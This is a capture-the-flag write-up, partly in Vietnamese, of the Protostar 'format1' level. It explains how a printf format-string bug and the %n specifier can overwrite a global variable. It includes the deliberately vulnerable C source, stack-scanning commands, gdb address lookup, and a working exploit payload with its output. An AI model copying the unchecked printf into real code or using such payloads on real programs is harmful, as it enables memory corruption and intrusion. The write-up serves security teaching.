# FORMAT ONE

## About

This level shows how format strings can be used to modify arbitrary memory locations.

Hints

  * objdump -t is your friend, and your input string lies far up the stack :)

This level is at /opt/protostar/bin/format1

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Solutions

`FORMAT ONE` cho chúng ta thấy cách mà chúng ta có thể sử dụng chuỗi định dạng để thay đổi giá trị tại vị trí tùy ý trên bộ nhớ. Thử thách sẽ hoàn thành khi ta thay đổi được giá trị của biến toàn cục `target` != 0 vaf in ra `"you have modified the target :)"`.

Đầu tiên ta đi tìm input của chúng ta được định dạng ở parameter thứ mấy bằng cách quét stack.

```
root@protostar:/opt/protostar/bin# ./format1 $(python -c 'print "ABCDEFGH" + ".%x" * 135')
ABCDEFGH.804960c.bffffb38.8048469.b7fd8304.b7fd7ff4.bffffb38.8048435.bffffd08.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbb8.b7eadc76.2.bffffbe4.bffffbf0.b7fe1848.bffffba0.ffffffff.b7ffeff4.804824d.1.bffffba0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbb8.6df3930f.47bd651f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffbe4.8048450.8048440.b7ff1040.bffffbdc.b7fff8f8.2.bffffcfe.bffffd08.0.bffffea6.bffffeba.bffffeca.bffffeec.bffffeff.bfffff09.bfffff1d.bfffff5f.bfffff76.bfffff87.bfffff8f.bfffff9a.bfffffa7.bfffffdd.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcdb.1f.bffffff2.f.bffffceb.0.0.0.0.f000000.897af4f1.9384902.1e7fa30d.6995b4d0.363836.0.0.0.2f2e0000.6d726f66.317461.44434241.48474645.2e78252e.252e7825.78252e78.2e78252e
```

"ABCD" được định dạng ở parameter thứ 130, ta sẽ căn chỉnh lại payload quét stack để dễ sửa đổi thành payload khai thác của chúng ta.

```
root@protostar:/opt/protostar/bin# ./format1 $(python -c 'print "ABCDEFGH" + ".%x" * 129 + ".%x" + ".%x" * 5')
```

Bây giờ chúng ta sẽ tìm hiểu về một `type` định dạng chuỗi là `%n`. Định dạng chuỗi `%n` cho phép người sử dụng ghi vào địa chỉ là giá trị hiện tại của đối số số lượng ký tự được in ra màn hình.

VD: ta có code C `fmt_n.c` sau.

```
#include<stdio.h>

int main(){
	int val;
	val = 1;
	printf("val = %d\n", val);
	printf("blah %n blah\n", &val);		// "blah " have five character
	printf("val = %d\n", val);
	return 0;
}
```
Run code

```
$ ./fmt_n
val = 1
blah  blah
val = 5
```

Biến val đã bị thay đổi thành giá trị = 5.

Kết thúc vd tôi nghĩ đến đây bạn đã có thể hiểu được `%n` thực sự làm gì với biến hoặc một địa chỉ bất kỳ trong bộ nhớ khi nó được nhận làm đối số.

Vậy nên bây giờ việc chúng ta cần làm để vượt qua `FORMAT ONE` là tìm được địa chỉ của biến toàn cục `target` và thay `"ABCD"` bằng địa chỉ đó để chuỗi định dạng thứ 130 nhận nó làm đối số rồi viết vào đó giá trị khác 0 khi `%x` được thay `%n`.

Tìm địa chỉ của `target` = `gdb`:

```
root@protostar:/opt/protostar/bin# gdb -q ./format1
Reading symbols from /opt/protostar/bin/format1...done.
(gdb) p target
$1 = 0
(gdb) p &target
$2 = (int *) 0x8049638
(gdb)
```

Tiến hành khai thác:

```
root@protostar:/opt/protostar/bin# ./format1 $(python -c 'print "\x38\x96\x04\x08EFGH" + ".%x" * 129 + ".%n" + ".%x" * 5')
8EFGH.804960c.bffffb38.8048469.b7fd8304.b7fd7ff4.bffffb38.8048435.bffffd08.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbb8.b7eadc76.2.bffffbe4.bffffbf0.b7fe1848.bffffba0.ffffffff.b7ffeff4.804824d.1.bffffba0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbb8.f1fa7928.dbb48f38.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffbe4.8048450.8048440.b7ff1040.bffffbdc.b7fff8f8.2.bffffcfe.bffffd08.0.bffffea6.bffffeba.bffffeca.bffffeec.bffffeff.bfffff09.bfffff1d.bfffff5f.bfffff76.bfffff87.bfffff8f.bfffff9a.bfffffa7.bfffffdd.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcdb.1f.bffffff2.f.bffffceb.0.0.0.0.2e000000.7ccf99f4.572b8706.8ec651d0.6958b2da.363836.0.0.0.2f2e0000.6d726f66.317461..48474645.2e78252e.252e7825.78252e78.2e78252eyou have modified the target :)
root@protostar:/opt/protostar/bin#
```


## Documents

<https://en.wikipedia.org/wiki/Printf_format_string>

<https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c>




